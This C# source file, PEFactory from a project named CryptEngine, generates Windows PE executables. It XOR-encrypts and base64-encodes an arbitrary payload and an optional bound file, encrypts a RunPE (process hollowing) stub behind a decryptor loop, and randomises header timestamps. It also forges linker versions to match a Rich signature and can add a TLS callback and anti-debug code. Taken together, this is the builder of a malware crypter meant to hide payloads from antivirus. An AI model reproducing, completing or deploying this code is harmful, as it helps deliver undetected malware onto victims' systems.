//#define TLS

using CryptEngine.NewPE.Structs;
using CryptEngine.Extensions;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using CryptEngine.Cryptography;


namespace CryptEngine.NewPE
{
    public static class PEFactory
    {

        private static Random _Random = new Random();

        public static void InitializeSections(NewPE PE)
        {
            // <--- Text Section --->
            {
                PE_SECTION_HEADER TextSectionHeader = new PE_SECTION_HEADER()
                {
                    Name = new char[] { '.', 't', 'e', 'x', 't' },
                    Characteristics = 0x60000020
                };

                PE.Sections.AddFirst(TextSectionHeader);
            }

            // <--- IData Section --->
            {
                PE_SECTION_HEADER IDataSectionHeader = new PE_SECTION_HEADER()
                {
                    Name = new char[] { '.', 'i', 'd', 'a', 't', 'a' },
                    Characteristics = 0x40000040
                };

                PE.Sections.AddLast(IDataSectionHeader);
            }

            // <--- Data Section --->
            {
                PE_SECTION_HEADER DataSectionHeader = new PE_SECTION_HEADER()
                {
                    Name = new char[] { '.', 'd', 'a', 't', 'a' },
                    Characteristics = 0xC0000040
                };

                PE.Sections.AddLast(DataSectionHeader);
            }

#if TLS
            // <--- TLS Section --->
            {
                PE_SECTION_HEADER TLSSectionHeader = new PE_SECTION_HEADER()
                {
                    Name = new char[] { '.', 'b', 's', 's' },
                    Characteristics = 0xC0000040
                };

                PE.Sections.AddLast(TLSSectionHeader);
            }
#endif
        }

        public static void InitializeNtHeader(NewPE PE)
        {
            // <--- File Header --->
            {
                PE.NtHeader.FileHeader.Machine = 0x14c;
                PE.NtHeader.FileHeader.NumberOfSections = (ushort)PE.Sections.Count;
                PE.NtHeader.FileHeader.TimeDateStamp = (uint)_Random.Next(0x40000000, 0x4C000000);
                PE.NtHeader.FileHeader.PointerToSymbolTable = 0;
                PE.NtHeader.FileHeader.NumberOfSymbols = 0;
                PE.NtHeader.FileHeader.SizeOfOptionalHeader = 0xE0;
                PE.NtHeader.FileHeader.Characteristics = 0x103;
            }

            // <--- Optional Header --->
            {
                // <--- LinkerVersions must match the Rich Signature --->
                PE.NtHeader.OptionalHeader.MajorLinkerVersion = 0x06;
                PE.NtHeader.OptionalHeader.MinorLinkerVersion = 0x00;

                PE.NtHeader.OptionalHeader.MajorOperatingSystemVersion = 4;
                PE.NtHeader.OptionalHeader.MajorImageVersion = 4;
                PE.NtHeader.OptionalHeader.MajorSubsystemVersion = 4;

                PE.NtHeader.OptionalHeader.DllCharacteristics = 0x00;

                PE.NtHeader.OptionalHeader.ImageBase = 0x00400000;
                PE.NtHeader.OptionalHeader.SectionAlignment = 0x1000;
                PE.NtHeader.OptionalHeader.FileAlignment = 0x200;
            }
        }

        public static void CalculateNtHeader(NewPE PE, int nCountImportedModules)
        {
            PE.NtHeader.OptionalHeader.SizeOfCode = ALIGN_UP(GetSectionByName(".text", PE).VirtualSize, PE.NtHeader.OptionalHeader.FileAlignment);

            PE.NtHeader.OptionalHeader.SizeOfInitializedData = ALIGN_UP(GetSectionByName(".idata", PE).VirtualSize, PE.NtHeader.OptionalHeader.FileAlignment) +
                                                               ALIGN_UP(GetSectionByName(".data", PE).VirtualSize, PE.NtHeader.OptionalHeader.FileAlignment);

#if TLS
            PE.NtHeader.OptionalHeader.SizeOfInitializedData += ALIGN_UP(GetSectionByName(".bss", PE).VirtualSize, PE.NtHeader.OptionalHeader.FileAlignment);
#endif

            PE.NtHeader.OptionalHeader.BaseOfCode = GetSectionByName(".text", PE).VirtualAddress;
            PE.NtHeader.OptionalHeader.BaseOfData = GetSectionByName(".idata", PE).VirtualAddress; // .data?

            PE.NtHeader.OptionalHeader.SizeOfHeaders = ALIGN_UP(PE.HeaderSize, PE.NtHeader.OptionalHeader.FileAlignment);
            PE.NtHeader.OptionalHeader.SizeOfImage = PE.Sections.Last.Value.VirtualAddress + ALIGN_UP(PE.Sections.Last.Value.VirtualSize, PE.NtHeader.OptionalHeader.SectionAlignment);

            PE.NtHeader.OptionalHeader.AddressOfEntryPoint = (uint)(GetSectionByName(".text", PE).VirtualAddress + PE.JunkInfo.SIZE_PRE_EP_FUNCTIONS);

            //  uint _magic = (uint)((nCountImportedModules + 1) * 20);

            PE.NtHeader.OptionalHeader.ImportDirectory.VirtualAddress = GetSectionByName(".idata", PE).VirtualAddress;
            PE.NtHeader.OptionalHeader.ImportDirectory.Size = GetSectionByName(".idata", PE).VirtualSize; // _magic;

            ///            PE.NtHeader.OptionalHeader.ImportAddressTableDirectory.VirtualAddress = GetSectionByName(".idata", PE).VirtualAddress + _magic;
            ///         PE.NtHeader.OptionalHeader.ImportAddressTableDirectory.Size = GetSectionByName(".idata", PE).VirtualSize - _magic;

            PE.NtHeader.OptionalHeader.TLSDirectory.VirtualAddress = GetSectionByName(".data", PE).VirtualAddress + (uint)PE.PeDirectory.RunPEObjectPath.ReadBytes().Length + 16;
            PE.NtHeader.OptionalHeader.TLSDirectory.Size = 0x24;

#if TLS
            PE.NtHeader.OptionalHeader.TLSDirectory.VirtualAddress = GetSectionByName(".data", PE).VirtualAddress + (uint)PE.PeDirectory.RunPEObjectPath.ReadBytes().Length + 16;
            PE.NtHeader.OptionalHeader.TLSDirectory.Size = 0x24;
#endif

        }

        public static void CalculateSectionHeaders(NewPE PE)
        {
            PE_SECTION_HEADER shText = GetSectionByName(".text", PE);
            PE_SECTION_HEADER shIData = GetSectionByName(".idata", PE);
            PE_SECTION_HEADER shData = GetSectionByName(".data", PE);

#if TLS
            PE_SECTION_HEADER shTLS = GetSectionByName(".bss", PE);
#endif

            uint sizeOfText = (uint)PE.PeDirectory.TextObjectPath.ReadBytes().Length;
            uint sizeOfIData = (uint)PE.PeDirectory.IDataObjectPath.ReadBytes().Length;
            uint sizeOfData = (uint)PE.PeDirectory.DataObjectPath.ReadBytes().Length;

#if TLS
            uint sizeOfTLS = (uint)PE.PeDirectory.TLSObjectPath.ReadBytes().Length;
#endif

            /* COMPUTE TEXT */
            shText.VirtualSize = sizeOfText;
            shText.VirtualAddress = PE.NtHeader.OptionalHeader.SectionAlignment;
            shText.SizeOfRawData = ALIGN_UP(sizeOfText, PE.NtHeader.OptionalHeader.FileAlignment);
            shText.PointerToRawData = 0;

            /* COMPUTE IDATA */
            shIData.VirtualSize = sizeOfIData;
            shIData.VirtualAddress =
                ((shText.VirtualAddress + ALIGN_UP(shText.SizeOfRawData, PE.NtHeader.OptionalHeader.SectionAlignment)));
            shIData.SizeOfRawData = ALIGN_UP(sizeOfIData, PE.NtHeader.OptionalHeader.FileAlignment);
            shIData.PointerToRawData = 0;

            /* COMPUTE DATA */
            shData.VirtualSize = sizeOfData;
            shData.VirtualAddress =
                ((shIData.VirtualAddress + ALIGN_UP(shIData.SizeOfRawData, PE.NtHeader.OptionalHeader.SectionAlignment)));
            shData.SizeOfRawData = ALIGN_UP(sizeOfData, PE.NtHeader.OptionalHeader.FileAlignment);
            shData.PointerToRawData = 0;

#if TLS
            /* COMPUTE TLS */
            shTLS.VirtualSize = sizeOfTLS;
            shTLS.VirtualAddress =
                ((shData.VirtualAddress + ALIGN_UP(shData.SizeOfRawData, PE.NtHeader.OptionalHeader.SectionAlignment)));
            shTLS.SizeOfRawData = ALIGN_UP(sizeOfTLS, PE.NtHeader.OptionalHeader.FileAlignment);
            shTLS.PointerToRawData = 0;
#endif

            string SectionHeadersInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "section_addresses.inc");

            if (File.Exists(SectionHeadersInclude))
                File.Delete(SectionHeadersInclude);

#if TLS
            string Format = "TEXT_SECTION_ADDRESS EQU 0x{0}\n" +
                            "IDATA_SECTION_ADDRESS EQU 0x{1}\n" +
                            "DATA_SECTION_ADDRESS EQU 0x{2}\n" +
                            "TLS_SECTION_ADDRESS EQU 0x{3}\n";

            Format = string.Format(Format,
                                   shText.VirtualAddress.ToString("X8"),
                                   shIData.VirtualAddress.ToString("X8"),
                                   shData.VirtualAddress.ToString("X8"),
                                   shTLS.VirtualAddress.ToString("X8"));
#else
            string Format = "TEXT_SECTION_ADDRESS EQU 0x{0}\n" +
                            "IDATA_SECTION_ADDRESS EQU 0x{1}\n" +
                            "DATA_SECTION_ADDRESS EQU 0x{2}\n";

            Format = string.Format(Format,
                                   shText.VirtualAddress.ToString("X8"),
                                   shIData.VirtualAddress.ToString("X8"),
                                   shData.VirtualAddress.ToString("X8"));
#endif

            File.WriteAllText(SectionHeadersInclude, Format);

            PEFactory.CompileTextSection(PE);
            PEFactory.CompileIDataSection(PE);
            PEFactory.CompileRunPESection(PE);
            PEFactory.CompileDataSection(PE);

#if TLS
            PEFactory.CompileTLSSection(PE);
#endif

            ReplaceSectionByName(".text", shText, PE);
            ReplaceSectionByName(".idata", shIData, PE);
            ReplaceSectionByName(".data", shData, PE);

#if TLS
            ReplaceSectionByName(".bss", shTLS, PE);
#endif
        }

        public static void ConstructTLSCallback(NewPE PE)
        {
            string TLSOffsetInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "tls_callback_offset.inc");

            string Format = "TLS_CALLBACK_OFFSET EQU 0x{0}";


            if (File.Exists(TLSOffsetInclude))
                File.Delete(TLSOffsetInclude);

            Format = string.Format(Format, (PE.JunkInfo.SIZE_PRE_EP_FUNCTIONS + PE.JunkInfo.SIZE_EP_FUNCTION).ToString("X8"));

            File.AppendAllText(TLSOffsetInclude, Format);

            PEFactory.CompileDataSection(PE);
            //PEFactory.CompileTLSSection(PE);
        }

        public static void FixDecryptorLoop(NewPE PE)
        {
            string RunPELengthInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "runpe_length.inc");

            string Format = "RUNPE_CODE_LENGTH EQU 0x{0}";

            if (File.Exists(RunPELengthInclude))
                File.Delete(RunPELengthInclude);

            Format = string.Format(Format, PE.PeDirectory.RunPEObjectPath.ReadBytes().Length.ToString("X8"));

            File.WriteAllText(RunPELengthInclude, Format);
            PEFactory.CompileTextSection(PE);
        }

        public static void EncryptCodeAndAddKey(NewPE PE)
        {
            byte[] pKey = new byte[16];
            Keys.PopulateBuffer(pKey);

            byte[] pRunPE = PE.PeDirectory.RunPEObjectPath.ReadBytes();
            Xor.EncodeDecodeData(pRunPE, pKey);

            if (File.Exists(PE.PeDirectory.RunPEObjectPath))
                File.Delete(PE.PeDirectory.RunPEObjectPath);

            PE.PeDirectory.RunPEObjectPath.WriteFile(pRunPE);

            string KeyInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "runpe_key.inc");
            string Format = pKey.ToASMBuffer();

            if (File.Exists(KeyInclude))
                File.Delete(KeyInclude);

            File.WriteAllText(KeyInclude, Format);

            PEFactory.CompileDataSection(PE);
        }

        public static void EncryptAndEncodePayload(NewPE PE, string PayloadPath)
        {
            byte[] pKey = new byte[16];
            Keys.PopulateBuffer(pKey);

            byte[] pFileBuffer = PayloadPath.ReadBytes();
            Xor.EncodeDecodeData(pFileBuffer, pKey);

            pFileBuffer = new ASCIIEncoding().GetBytes(Convert.ToBase64String(pFileBuffer));

            string PayloadLengthInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "payload_length.inc");
            string Format = "PAYLOAD_LENGTH EQU 0x{0}";
            Format = string.Format(Format, pFileBuffer.Length.ToString("X8"));

            if (File.Exists(PayloadLengthInclude))
                File.Delete(PayloadLengthInclude);

            File.WriteAllText(PayloadLengthInclude, Format);

            string PayloadKeyInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "payload_key.bin");
            string PayloadInclude = Path.Combine(PE.PeDirectory.IncludeDirectory, "payload.bin");

            if (File.Exists(PayloadKeyInclude))
                File.Delete(PayloadKeyInclude);

            if (File.Exists(PayloadInclude))
                File.Delete(PayloadInclude);

            File.WriteAllBytes(PayloadKeyInclude, pKey);
            File.WriteAllBytes(PayloadInclude, pFileBuffer);
        }

        const ushort COMPRESSION_FORMAT_LZNT1 = 2;
        const ushort COMPRESSION_ENGINE_MAXIMUM = 0x100;

        [DllImport("ntdll.dll")]
        static extern uint RtlGetCompressionWorkSpaceSize(ushort CompressionFormat, out uint pNeededBufferSize, out uint Unknown);

        [DllImport("ntdll.dll")]
        static extern uint RtlCompressBuffer(ushort CompressionFormat, byte[] SourceBuffer, int SourceBufferLength, byte[] DestinationBuffer,
            int DestinationBufferLength, uint Unknown, out int pDestinationSize, IntPtr WorkspaceBuffer);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr LocalAlloc(int uFlags, IntPtr sizetdwBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        internal static byte[] Compress(byte[] buffer)
        {
            var outBuf = new byte[buffer.Length * 6];
            uint dwSize = 0, dwRet = 0;
            uint ret = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, out dwSize, out dwRet);
            if (ret != 0)
            {
                return null;
            }

            int dstSize = 0;
            IntPtr hWork = LocalAlloc(0, new IntPtr(dwSize));
            ret = RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, buffer,
                buffer.Length, outBuf, outBuf.Length, 0, out dstSize, hWork);
            if (ret != 0)
            {
                return null;
            }

            LocalFree(hWork);

            Array.Resize(ref outBuf, dstSize);
            return outBuf;
        }

        public static void EncryptAndEncodeBind(NewPE PE, string BindPath)
        {
            byte[] pKey = PE.PeDirectory.PayloadKeyIncPath.ReadBytes();
            byte[] pBind = BindPath.ReadBytes();

            Xor.EncodeDecodeData(pBind, pKey);
            pBind = new ASCIIEncoding().GetBytes(Convert.ToBase64String(pBind));

            if (File.Exists(PE.PeDirectory.BindIncPath))
                File.Delete(PE.PeDirectory.BindIncPath);

            File.WriteAllBytes(PE.PeDirectory.BindIncPath, pBind);
        }

        public static void RemoveAntiDebug(NewPE PE, bool _RemoveAntiDebug)
        {
            if (_RemoveAntiDebug)
            {
                File.Delete(PE.PeDirectory.AntiDebugIncPath);
                File.WriteAllText(PE.PeDirectory.AntiDebugIncPath, string.Empty);
            }
        }

        public static void AddSectionDatas(NewPE PE)
        {
            File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
            File.AppendAllText(PE.PeDirectory.MainPath, string.Format("align 0x{0}, db 0", PE.NtHeader.OptionalHeader.FileAlignment.ToString("X8")));
            File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);

            foreach (PE_SECTION_HEADER SectionHeader in PE.Sections)
            {
                string WriteableName = string.Concat(new string(SectionHeader.Name).TrimStart('.').ToUpper(), ":");

                File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
                File.AppendAllText(PE.PeDirectory.MainPath, WriteableName);
                File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
                File.AppendAllText(PE.PeDirectory.MainPath, string.Format(
                                                                        "\tincbin \"obj/{0}\"",
                                                                        Path.GetFileName(GetObjPathFromSectionName(new string(SectionHeader.Name), PE))));
                File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
                File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
                File.AppendAllText(PE.PeDirectory.MainPath, string.Format("align 0x{0}, db 0", PE.NtHeader.OptionalHeader.FileAlignment.ToString("X8")));
                File.AppendAllText(PE.PeDirectory.MainPath, Environment.NewLine);
            }
        }

        private static string GetObjPathFromSectionName(string Name, NewPE PE)
        {
            return Directory.GetFiles(PE.PeDirectory.ObjDirectory).Where(F => Path.GetFileNameWithoutExtension(F) == Name.Trim('.')).FirstOrDefault();
        }

        private static uint ALIGN_UP(uint x, uint y)
        {
            return ((x + (y - 1)) & (~(y - 1)));
        }

        private static uint ALIGN_DOWN(uint x, uint y)
        {
            return (x & (~(y - 1)));
        }

        public static PE_SECTION_HEADER GetSectionByName(string Name, NewPE PE)
        {
            return PE.Sections.Where(Section => new string(Section.Name) == Name).FirstOrDefault();
        }

        private static void ReplaceSectionByName(string Name, PE_SECTION_HEADER NewSection, NewPE PE)
        {
            PE_SECTION_HEADER oldSection = GetSectionByName(Name, PE);
            PE.Sections.Find(oldSection).Value = NewSection;
        }

        public static void CompileTextSection(NewPE PE)
        {
            CompileSection("text", PE);
        }

        public static void CompileDataSection(NewPE PE)
        {
            CompileSection("data", PE);
        }

        public static void CompileIDataSection(NewPE PE)
        {
            CompileSection("idata", PE);
        }

        public static void CompileRunPESection(NewPE PE)
        {
            CompileSection("runpe", PE);
        }

        public static void CompileTLSSection(NewPE PE)
        {
            CompileSection("bss", PE);
        }

        public static void CompileMain(NewPE PE)
        {
            CompileSection("main", PE);
        }

        public static int ComputeArbitrarySize(string PathName, NewPE PE)
        {
            string TmpFile = Path.GetTempFileName();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = String.Format("-i \"{0}/\" -f bin \"{1}\" -o \"{2}\"",
                                               PE.PeDirectory.RootDirectoryPath,
                                               PathName,
                                               TmpFile);
            psi.FileName = PE.PeDirectory.CompilerPath;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;

            using (Process Proc = Process.Start(psi))
            {
                using (StreamReader sReader = Proc.StandardOutput)
                {
                    string res = sReader.ReadToEnd();
                }
            }

            if (File.Exists(TmpFile))
            {
                int nRet = TmpFile.ReadBytes().Length;
                File.Delete(TmpFile);
                return nRet;
            }
            else
            {
                return 0;
            }
        }

        public static string CompileArbitrary(string PathName, NewPE PE)
        {

            string TmpFile = Path.GetTempFileName();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = String.Format("-i \"{0}/\" -f bin \"{1}\" -o \"{2}\"",
                                               PE.PeDirectory.RootDirectoryPath,
                                               PathName,
                                               TmpFile);
            psi.FileName = PE.PeDirectory.CompilerPath;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;

            using (Process Proc = Process.Start(psi))
            {
                using (StreamReader sReader = Proc.StandardOutput)
                {
                    string res = sReader.ReadToEnd();
                }
            }

            if (File.Exists(TmpFile))
            {
                return TmpFile;
            }
            else
            {
                return null;
            }
        }

        private static void CompileSection(string SectionName, NewPE _PE)
        {
            string SectionSourcePath;
            string SectionObjPath;

            switch (SectionName)
            {
                case "text":
                    SectionSourcePath = _PE.PeDirectory.TextSectionPath;
                    SectionObjPath = _PE.PeDirectory.TextObjectPath;
                    break;
                case "data":
                    SectionSourcePath = _PE.PeDirectory.DataSectionPath;
                    SectionObjPath = _PE.PeDirectory.DataObjectPath;
                    break;
                case "idata":
                    SectionSourcePath = _PE.PeDirectory.IDataSectionPath;
                    SectionObjPath = _PE.PeDirectory.IDataObjectPath;
                    break;
                case "bss":
                    SectionSourcePath = _PE.PeDirectory.TLSSectionPath;
                    SectionObjPath = _PE.PeDirectory.TLSObjectPath;
                    break;
                case "runpe":
                    SectionSourcePath = _PE.PeDirectory.RunPESectionPath;
                    SectionObjPath = _PE.PeDirectory.RunPEObjectPath;
                    break;
                case "main":
                    SectionSourcePath = _PE.PeDirectory.MainPath;
                    SectionObjPath = _PE.PeDirectory.SavePath;
                    break;
                default:
                    SectionSourcePath = string.Empty;
                    SectionObjPath = string.Empty;
                    break;
            }


            if (File.Exists(SectionObjPath))
                File.Delete(SectionObjPath);

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = String.Format("-i \"{0}/\" -f bin \"{1}\" -o \"{2}\"",
                                               _PE.PeDirectory.RootDirectoryPath,
                                               SectionSourcePath,
                                               SectionObjPath);

            psi.FileName = _PE.PeDirectory.CompilerPath;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;

            using (Process Proc = Process.Start(psi))
            {
                using (StreamReader sReader = Proc.StandardOutput)
                {
                    string res = sReader.ReadToEnd();
                }
            }
        }
    }
}
